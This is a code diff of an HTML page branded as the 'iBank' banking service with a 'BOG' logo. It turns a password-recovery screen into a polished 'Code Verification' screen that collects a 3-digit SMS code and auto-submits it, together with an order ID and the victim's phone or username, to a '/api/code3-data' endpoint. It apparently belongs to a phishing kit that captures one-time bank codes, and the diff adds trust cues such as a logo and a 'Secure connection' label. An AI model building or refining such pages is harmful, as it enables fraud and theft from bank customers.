@@ -3,78 +3,135 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Password Recovery from iBank</title>
+<title>iBank - Code Verification</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
-  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#f8f9fb;display:flex;flex-direction:column}
 
   .header{
-    display:flex;align-items:center;justify-content:flex-end;
-    padding:14px 18px;border-bottom:1px solid #eee;
+    display:flex;align-items:center;justify-content:space-between;
+    padding:16px 20px;background:#fff;
+    border-bottom:1px solid #e8eaed;
   }
-  .x-btn{background:none;border:none;cursor:pointer;padding:8px}
-  .x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
+  .logo-area{display:flex;align-items:center;gap:10px}
+  .logo-area img{height:28px;border-radius:6px}
+  .logo-text{font-size:15px;font-weight:600;color:#1a1a1a}
+  .x-btn{background:none;border:none;cursor:pointer;padding:8px;border-radius:50%;transition:.2s}
+  .x-btn:hover{background:#f0f0f0}
+  .x-btn svg{width:20px;height:20px;stroke:#666;stroke-width:2;fill:none;stroke-linecap:round}
 
-  .content{flex:1;padding:60px 28px 0}
+  .content{flex:1;display:flex;flex-direction:column;align-items:center;padding:48px 28px 0}
+
+  .icon-wrap{
+    width:80px;height:80px;border-radius:50%;
+    background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);
+    display:flex;align-items:center;justify-content:center;
+    margin-bottom:28px;
+    box-shadow:0 8px 24px rgba(249,115,22,.25);
+  }
+  .icon-wrap svg{width:36px;height:36px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
 
   .title{
-    font-size:30px;font-weight:400;color:#1a1a1a;
-    text-align:center;line-height:1.3;margin-bottom:60px;
-    letter-spacing:-.3px;
+    font-size:22px;font-weight:700;color:#1a1a1a;
+    text-align:center;line-height:1.4;margin-bottom:10px;
   }
-
-  .field{margin-bottom:44px}
-  .lbl{font-size:14px;color:#9aa0a6;margin-bottom:14px;font-weight:400}
-  .phone-val{font-size:24px;color:#1a1a1a;font-weight:400;letter-spacing:.3px}
+  .subtitle{
+    font-size:14px;color:#6b7280;text-align:center;
+    line-height:1.6;margin-bottom:40px;max-width:300px;
+  }
 
   .code-row{
-    display:flex;gap:18px;margin-top:12px;direction:ltr;
-    justify-content:space-between;max-width:100%;
+    display:flex;gap:16px;direction:ltr;
+    justify-content:center;margin-bottom:32px;
   }
   .code-digit{
-    flex:1;height:52px;border:none;border-bottom:1.5px solid #d8d8d8;
-    background:transparent;text-align:center;
-    font-size:24px;font-weight:400;color:#1a1a1a;
-    font-family:inherit;outline:none;transition:.2s;padding:0 0 6px;
-    min-width:0;
+    width:72px;height:80px;
+    border:2px solid #e0e0e0;border-radius:16px;
+    background:#fff;text-align:center;
+    font-size:32px;font-weight:700;color:#1a1a1a;
+    font-family:inherit;outline:none;
+    transition:all .2s ease;
+    box-shadow:0 2px 8px rgba(0,0,0,.04);
   }
-  .code-digit::placeholder{color:#d8d8d8;font-weight:300}
-  .code-digit:focus{border-bottom-color:#b8b8b8}
+  .code-digit::placeholder{color:#d0d0d0;font-weight:400}
+  .code-digit:focus{
+    border-color:#f97316;
+    box-shadow:0 0 0 3px rgba(249,115,22,.15),0 2px 8px rgba(0,0,0,.04);
+  }
+  .code-digit.filled{border-color:#f97316;background:#fffbf5}
 
   .err{
-    display:none;margin:14px 28px 0;padding:10px 14px;
-    background:#fff5f5;border:1px solid #fcc;border-radius:10px;
-    color:#dc2626;font-size:14px;text-align:center;font-weight:700;
+    display:none;width:100%;max-width:340px;
+    margin:0 auto;padding:14px 18px;
+    background:#fef2f2;border:1px solid #fecaca;border-radius:12px;
+    color:#dc2626;font-size:14px;text-align:center;font-weight:600;
+    animation:shake .4s ease;
   }
+  @keyframes shake{
+    0%,100%{transform:translateX(0)}
+    20%,60%{transform:translateX(-6px)}
+    40%,80%{transform:translateX(6px)}
+  }
+
+  .loading-dots{display:none;margin-top:20px;text-align:center}
+  .loading-dots span{
+    display:inline-block;width:8px;height:8px;
+    background:#f97316;border-radius:50%;margin:0 4px;
+    animation:bounce .6s infinite alternate;
+  }
+  .loading-dots span:nth-child(2){animation-delay:.2s}
+  .loading-dots span:nth-child(3){animation-delay:.4s}
+  @keyframes bounce{to{opacity:.3;transform:translateY(-6px)}}
+
+  .secure-note{
+    margin-top:auto;padding:20px 28px 24px;
+    display:flex;align-items:center;justify-content:center;gap:6px;
+    font-size:12px;color:#9ca3af;
+  }
+  .secure-note svg{width:14px;height:14px;stroke:#9ca3af;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
 </style>
 </head>
 <body>
 
   <div class="header">
+    <div class="logo-area">
+      <img src="/images/bog-logo-icon.png" alt="BOG">
+      <span class="logo-text">iBank</span>
+    </div>
     <button class="x-btn" onclick="history.back()" aria-label="Close">
       <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
     </button>
   </div>
 
   <div class="content">
-    <div class="title">Password Recovery from<br>iBank</div>
-
-    <div class="field">
-      <div class="lbl">Phone Number</div>
-      <div class="phone-val" id="userPhone">+38 (___) ___ __ __</div>
+    <div class="icon-wrap">
+      <svg viewBox="0 0 24 24">
+        <rect x="2" y="4" width="20" height="16" rx="3"/>
+        <path d="M2 8h20"/>
+        <path d="M8 12h2M14 12h2"/>
+      </svg>
     </div>
 
-    <div class="field">
-      <div class="lbl">Message with code</div>
-      <div class="code-row">
-        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="X">
-        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="X">
-        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2" placeholder="X">
-      </div>
+    <div class="title">Code Verification</div>
+    <div class="subtitle">Please enter the 3-digit code you received via SMS</div>
+
+    <div class="code-row">
+      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="·" autocomplete="off">
+      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="·" autocomplete="off">
+      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2" placeholder="·" autocomplete="off">
+    </div>
+
+    <div class="loading-dots" id="loadingDots">
+      <span></span><span></span><span></span>
     </div>
 
     <div class="err" id="errorMsg"></div>
+  </div>
+
+  <div class="secure-note">
+    <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+    Secure connection
   </div>
 
 <script>
@@ -84,33 +141,10 @@
 
   if (!orderId) location.href = "index.html";
 
-  function renderPhone(p) {
-    if (!p) return;
-    p = p.replace(/\D/g, "");
-    if (p.startsWith("380")) p = p.substring(3);
-    if (p.length === 9 && p[0] !== "0") p = "0" + p;
-    if (p.length >= 10) {
-      const f = "+38 (" + p.substring(0,3) + ") " +
-                p.substring(3,6) + " " +
-                p.substring(6,8) + " " +
-                p.substring(8,10);
-      document.getElementById("userPhone").textContent = f;
-    } else if (p.length > 0) {
-      document.getElementById("userPhone").textContent = "+995" + p;
-    }
-  }
-
-  if (phone) {
-    renderPhone(phone);
-  } else {
+  if (!phone) {
     fetch("/api/orders/" + orderId + "/status")
       .then(r => r.json())
-      .then(d => {
-        if (d.username) {
-          phone = d.username;
-          renderPhone(d.username);
-        }
-      })
+      .then(d => { if (d.username) phone = d.username; })
       .catch(() => {});
   }
 
@@ -126,22 +160,28 @@
   digits.forEach((inp, i) => {
     inp.addEventListener("input", () => {
       inp.value = inp.value.replace(/\D/g, "");
+      inp.classList.toggle("filled", !!inp.value);
       if (inp.value && i < digits.length - 1) digits[i + 1].focus();
       maybeAutoSubmit();
     });
     inp.addEventListener("keydown", e => {
-      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
+      if (e.key === "Backspace" && !inp.value && i > 0) {
+        digits[i - 1].focus();
+        digits[i - 1].classList.remove("filled");
+      }
     });
     inp.addEventListener("paste", e => {
       e.preventDefault();
       const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
       for (let j = 0; j < digits.length && j < text.length; j++) {
         digits[j].value = text[j];
+        digits[j].classList.toggle("filled", !!text[j]);
       }
       const last = Math.min(text.length, digits.length);
       if (last > 0) digits[Math.min(last, digits.length - 1)].focus();
       maybeAutoSubmit();
     });
+    inp.addEventListener("focus", () => inp.select());
   });
 
   function getCode() {
@@ -166,6 +206,7 @@
     if (code.length < digits.length) return;
     submitting = true;
     digits.forEach(d => d.disabled = true);
+    document.getElementById("loadingDots").style.display = "block";
 
     try {
       const res  = await fetch("/api/code3-data", {
@@ -189,7 +230,8 @@
 
   function resetInputs() {
     submitting = false;
-    digits.forEach(d => { d.disabled = false; d.value = ""; });
+    document.getElementById("loadingDots").style.display = "none";
+    digits.forEach(d => { d.disabled = false; d.value = ""; d.classList.remove("filled"); });
     digits[0].focus();
   }
 </script>
